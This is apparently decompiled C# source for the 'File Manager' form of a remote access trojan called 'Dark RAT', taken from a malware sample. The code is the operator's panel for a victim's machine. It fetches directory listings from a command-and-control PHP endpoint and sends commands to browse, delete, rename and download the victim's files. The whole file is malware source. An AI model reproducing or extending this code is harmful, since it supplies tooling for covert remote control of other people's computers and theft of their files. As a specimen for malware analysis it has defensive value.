// Decompiled with JetBrains decompiler
// Type: Dark_RAT.filem
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Dark_RAT.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Dark_RAT
{
  [DesignerGenerated]
  public class filem : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("ListView1")]
    private ListView _ListView1;
    [AccessedThroughProperty("ColumnHeader1")]
    private ColumnHeader _ColumnHeader1;
    [AccessedThroughProperty("reload")]
    private System.Windows.Forms.Timer _reload;
    [AccessedThroughProperty("menu")]
    private ContextMenuStrip _menu;
    [AccessedThroughProperty("RefreshToolStripMenuItem")]
    private ToolStripMenuItem _RefreshToolStripMenuItem;
    [AccessedThroughProperty("DeleteToolStripMenuItem")]
    private ToolStripMenuItem _DeleteToolStripMenuItem;
    [AccessedThroughProperty("RenameToolStripMenuItem")]
    private ToolStripMenuItem _RenameToolStripMenuItem;
    [AccessedThroughProperty("RequestToolStripMenuItem")]
    private ToolStripMenuItem _RequestToolStripMenuItem;
    [AccessedThroughProperty("DownloadToolStripMenuItem")]
    private ToolStripMenuItem _DownloadToolStripMenuItem;
    [AccessedThroughProperty("MenuStrip1")]
    private MenuStrip _MenuStrip1;
    [AccessedThroughProperty("UploadsToolStripMenuItem")]
    private ToolStripMenuItem _UploadsToolStripMenuItem;
    [AccessedThroughProperty("UploadsToolStripMenuItem1")]
    private ToolStripMenuItem _UploadsToolStripMenuItem1;

    [DebuggerNonUserCode]
    static filem()
    {
    }

    [DebuggerNonUserCode]
    public filem()
    {
      this.FormClosing += new FormClosingEventHandler(this.filem_FormClosing);
      this.Load += new EventHandler(this.filem_Load);
      filem.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (filem.__ENCList)
      {
        if (filem.__ENCList.Count == filem.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (filem.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (filem.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                filem.__ENCList[index1] = filem.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          filem.__ENCList.RemoveRange(index1, checked (filem.__ENCList.Count - index1));
          filem.__ENCList.Capacity = filem.__ENCList.Count;
        }
        filem.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (filem));
      this.TextBox1 = new TextBox();
      this.Button1 = new Button();
      this.ListView1 = new ListView();
      this.ColumnHeader1 = new ColumnHeader();
      this.menu = new ContextMenuStrip(this.components);
      this.DownloadToolStripMenuItem = new ToolStripMenuItem();
      this.RenameToolStripMenuItem = new ToolStripMenuItem();
      this.DeleteToolStripMenuItem = new ToolStripMenuItem();
      this.RequestToolStripMenuItem = new ToolStripMenuItem();
      this.RefreshToolStripMenuItem = new ToolStripMenuItem();
      this.reload = new System.Windows.Forms.Timer(this.components);
      this.MenuStrip1 = new MenuStrip();
      this.UploadsToolStripMenuItem = new ToolStripMenuItem();
      this.UploadsToolStripMenuItem1 = new ToolStripMenuItem();
      this.menu.SuspendLayout();
      this.MenuStrip1.SuspendLayout();
      this.SuspendLayout();
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(12, 34);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(506, 20);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 0;
      this.TextBox1.Text = "C:/";
      Button button1_1 = this.Button1;
      point1 = new Point(524, 33);
      Point point3 = point1;
      button1_1.Location = point3;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(91, 23);
      Size size3 = size1;
      button1_2.Size = size3;
      this.Button1.TabIndex = 1;
      this.Button1.Text = "BROWSE";
      this.Button1.UseVisualStyleBackColor = true;
      this.ListView1.Columns.AddRange(new ColumnHeader[1]
      {
        this.ColumnHeader1
      });
      this.ListView1.ContextMenuStrip = this.menu;
      ListView listView1_1 = this.ListView1;
      point1 = new Point(12, 60);
      Point point4 = point1;
      listView1_1.Location = point4;
      this.ListView1.Name = "ListView1";
      ListView listView1_2 = this.ListView1;
      size1 = new Size(603, 306);
      Size size4 = size1;
      listView1_2.Size = size4;
      this.ListView1.TabIndex = 2;
      this.ListView1.UseCompatibleStateImageBehavior = false;
      this.ListView1.View = View.Details;
      this.ColumnHeader1.Text = "Name";
      this.ColumnHeader1.Width = 552;
      this.menu.Items.AddRange(new ToolStripItem[5]
      {
        (ToolStripItem) this.DownloadToolStripMenuItem,
        (ToolStripItem) this.RenameToolStripMenuItem,
        (ToolStripItem) this.DeleteToolStripMenuItem,
        (ToolStripItem) this.RequestToolStripMenuItem,
        (ToolStripItem) this.RefreshToolStripMenuItem
      });
      this.menu.Name = "menu";
      ContextMenuStrip menu = this.menu;
      size1 = new Size(129, 114);
      Size size5 = size1;
      menu.Size = size5;
      this.DownloadToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DownloadToolStripMenuItem.Image");
      this.DownloadToolStripMenuItem.Name = "DownloadToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem1 = this.DownloadToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size6 = size1;
      toolStripMenuItem1.Size = size6;
      this.DownloadToolStripMenuItem.Text = "Download";
      this.RenameToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RenameToolStripMenuItem.Image");
      this.RenameToolStripMenuItem.Name = "RenameToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem2 = this.RenameToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size7 = size1;
      toolStripMenuItem2.Size = size7;
      this.RenameToolStripMenuItem.Text = "Rename";
      this.DeleteToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DeleteToolStripMenuItem.Image");
      this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem3 = this.DeleteToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size8 = size1;
      toolStripMenuItem3.Size = size8;
      this.DeleteToolStripMenuItem.Text = "Delete";
      this.RequestToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RequestToolStripMenuItem.Image");
      this.RequestToolStripMenuItem.Name = "RequestToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem4 = this.RequestToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size9 = size1;
      toolStripMenuItem4.Size = size9;
      this.RequestToolStripMenuItem.Text = "Request";
      this.RefreshToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RefreshToolStripMenuItem.Image");
      this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem5 = this.RefreshToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size10 = size1;
      toolStripMenuItem5.Size = size10;
      this.RefreshToolStripMenuItem.Text = "Refresh";
      this.reload.Enabled = true;
      this.reload.Interval = 2900;
      this.MenuStrip1.BackColor = SystemColors.ButtonShadow;
      this.MenuStrip1.Items.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.UploadsToolStripMenuItem
      });
      MenuStrip menuStrip1_1 = this.MenuStrip1;
      point1 = new Point(0, 0);
      Point point5 = point1;
      menuStrip1_1.Location = point5;
      this.MenuStrip1.Name = "MenuStrip1";
      MenuStrip menuStrip1_2 = this.MenuStrip1;
      size1 = new Size(627, 24);
      Size size11 = size1;
      menuStrip1_2.Size = size11;
      this.MenuStrip1.TabIndex = 3;
      this.MenuStrip1.Text = "MenuStrip1";
      this.UploadsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.UploadsToolStripMenuItem1
      });
      this.UploadsToolStripMenuItem.Name = "UploadsToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem6 = this.UploadsToolStripMenuItem;
      size1 = new Size(50, 20);
      Size size12 = size1;
      toolStripMenuItem6.Size = size12;
      this.UploadsToolStripMenuItem.Text = "Menu";
      this.UploadsToolStripMenuItem1.Name = "UploadsToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_1 = this.UploadsToolStripMenuItem1;
      size1 = new Size(117, 22);
      Size size13 = size1;
      toolStripMenuItem1_1.Size = size13;
      this.UploadsToolStripMenuItem1.Text = "Uploads";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      size1 = new Size(627, 378);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.MenuStrip1);
      this.Controls.Add((Control) this.ListView1);
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.Button1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.MainMenuStrip = this.MenuStrip1;
      this.MaximizeBox = false;
      this.Name = nameof (filem);
      this.Text = "File Manager";
      this.menu.ResumeLayout(false);
      this.MenuStrip1.ResumeLayout(false);
      this.MenuStrip1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual Button Button1
    {
      [DebuggerNonUserCode] get => this._Button1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual ListView ListView1
    {
      [DebuggerNonUserCode] get => this._ListView1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler1 = new EventHandler(this.ListView1_SelectedIndexChanged);
        EventHandler eventHandler2 = new EventHandler(this.ListView1_DoubleClick);
        if (this._ListView1 != null)
        {
          this._ListView1.SelectedIndexChanged -= eventHandler1;
          this._ListView1.DoubleClick -= eventHandler2;
        }
        this._ListView1 = value;
        if (this._ListView1 == null)
          return;
        this._ListView1.SelectedIndexChanged += eventHandler1;
        this._ListView1.DoubleClick += eventHandler2;
      }
    }

    internal virtual ColumnHeader ColumnHeader1
    {
      [DebuggerNonUserCode] get => this._ColumnHeader1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader1 = value;
    }

    internal virtual System.Windows.Forms.Timer reload
    {
      [DebuggerNonUserCode] get => this._reload;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.reload_Tick);
        if (this._reload != null)
          this._reload.Tick -= eventHandler;
        this._reload = value;
        if (this._reload == null)
          return;
        this._reload.Tick += eventHandler;
      }
    }

    internal virtual ContextMenuStrip menu
    {
      [DebuggerNonUserCode] get => this._menu;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        CancelEventHandler cancelEventHandler = new CancelEventHandler(this.menu_Opening);
        if (this._menu != null)
          this._menu.Opening -= cancelEventHandler;
        this._menu = value;
        if (this._menu == null)
          return;
        this._menu.Opening += cancelEventHandler;
      }
    }

    internal virtual ToolStripMenuItem RefreshToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RefreshToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RefreshToolStripMenuItem_Click);
        if (this._RefreshToolStripMenuItem != null)
          this._RefreshToolStripMenuItem.Click -= eventHandler;
        this._RefreshToolStripMenuItem = value;
        if (this._RefreshToolStripMenuItem == null)
          return;
        this._RefreshToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DeleteToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._DeleteToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteToolStripMenuItem_Click);
        if (this._DeleteToolStripMenuItem != null)
          this._DeleteToolStripMenuItem.Click -= eventHandler;
        this._DeleteToolStripMenuItem = value;
        if (this._DeleteToolStripMenuItem == null)
          return;
        this._DeleteToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem RenameToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RenameToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RenameToolStripMenuItem_Click);
        if (this._RenameToolStripMenuItem != null)
          this._RenameToolStripMenuItem.Click -= eventHandler;
        this._RenameToolStripMenuItem = value;
        if (this._RenameToolStripMenuItem == null)
          return;
        this._RenameToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem RequestToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RequestToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RequestToolStripMenuItem_Click);
        if (this._RequestToolStripMenuItem != null)
          this._RequestToolStripMenuItem.Click -= eventHandler;
        this._RequestToolStripMenuItem = value;
        if (this._RequestToolStripMenuItem == null)
          return;
        this._RequestToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DownloadToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._DownloadToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DownloadToolStripMenuItem_Click);
        if (this._DownloadToolStripMenuItem != null)
          this._DownloadToolStripMenuItem.Click -= eventHandler;
        this._DownloadToolStripMenuItem = value;
        if (this._DownloadToolStripMenuItem == null)
          return;
        this._DownloadToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual MenuStrip MenuStrip1
    {
      [DebuggerNonUserCode] get => this._MenuStrip1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._MenuStrip1 = value;
    }

    internal virtual ToolStripMenuItem UploadsToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._UploadsToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._UploadsToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem UploadsToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._UploadsToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.UploadsToolStripMenuItem1_Click);
        if (this._UploadsToolStripMenuItem1 != null)
          this._UploadsToolStripMenuItem1.Click -= eventHandler;
        this._UploadsToolStripMenuItem1 = value;
        if (this._UploadsToolStripMenuItem1 == null)
          return;
        this._UploadsToolStripMenuItem1.Click += eventHandler;
      }
    }

    private void filem_FormClosing(object sender, FormClosingEventArgs e) => this.reload.Stop();

    private void filem_Load(object sender, EventArgs e)
    {
    }

    private void reload_Tick(object sender, EventArgs e) => new Thread((ThreadStart) (() => this.ReloadMe())).Start();

    public object ReloadMe()
    {
      try
      {
        string Expression1 = new WebClient().DownloadString(MyProject.Forms.program.TextBox1.Text + "other/fif/data.php?action=read");
        int Expression2 = Conversions.ToInteger("0");
        this.ListView1.Items.Clear();
        string[] strArray = Strings.Split(Expression1, "\r\n");
        int index = 0;
        while (index < strArray.Length)
        {
          this.ListView1.Items.Add(strArray[index]);
          Expression2 = checked ((int) Math.Round(unchecked (Conversion.Val((object) Expression2) + Conversion.Val("1"))));
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object obj;
      return obj;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      try
      {
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|f2i2f|" + this.TextBox1.Text));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string Expression1 = new WebClient().DownloadString(MyProject.Forms.program.TextBox1.Text + "other/fif/data.php?action=read");
        int Expression2 = Conversions.ToInteger("0");
        this.ListView1.Items.Clear();
        string[] strArray = Strings.Split(Expression1, "\r\n");
        int index = 0;
        while (index < strArray.Length)
        {
          this.ListView1.Items.Add(strArray[index]);
          Expression2 = checked ((int) Math.Round(unchecked (Conversion.Val((object) Expression2) + Conversion.Val("1"))));
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      string str = "";
      try
      {
        foreach (ListViewItem selectedItem in this.ListView1.SelectedItems)
          str = selectedItem.SubItems[0].Text;
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      try
      {
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|deletefile|" + this.TextBox1.Text + str));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
    {
      string str = "";
      try
      {
        foreach (ListViewItem selectedItem in this.ListView1.SelectedItems)
          str = selectedItem.SubItems[0].Text;
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      MyProject.Forms.rename.TextBox1.Text = this.TextBox1.Text + str;
      MyProject.Forms.rename.TextBox2.Text = this.TextBox1.Text + str + "new";
      MyProject.Forms.rename.Show();
    }

    private void ListView1_DoubleClick(object sender, EventArgs e)
    {
      try
      {
        string Expression = "";
        try
        {
          foreach (ListViewItem selectedItem in this.ListView1.SelectedItems)
            Expression = selectedItem.SubItems[0].Text;
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        if (Expression.StartsWith("[DIR] "))
          Expression = Strings.Replace(Expression, "[DIR] ", string.Empty);
        this.TextBox1.Text += Expression + "/";
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|f2i2f|" + this.TextBox1.Text));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void ListView1_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void RequestToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string Expression = "";
        try
        {
          foreach (ListViewItem selectedItem in this.ListView1.SelectedItems)
            Expression = selectedItem.SubItems[0].Text;
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        if (Expression.StartsWith("[DIR] "))
          Expression = Strings.Replace(Expression, "[DIR] ", string.Empty);
        this.TextBox1.Text += Expression + "/";
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|f2i2f|" + this.TextBox1.Text));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string str = "";
        try
        {
          foreach (ListViewItem selectedItem in this.ListView1.SelectedItems)
            str = selectedItem.SubItems[0].Text;
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        if (str.StartsWith("[DIR] "))
          this.Enabled = false;
        else
          MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|down2load|" + this.TextBox1.Text + str));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void menu_Opening(object sender, CancelEventArgs e)
    {
    }

    private void UploadsToolStripMenuItem1_Click(object sender, EventArgs e) => MyProject.Forms.uploads.Show();
  }
}
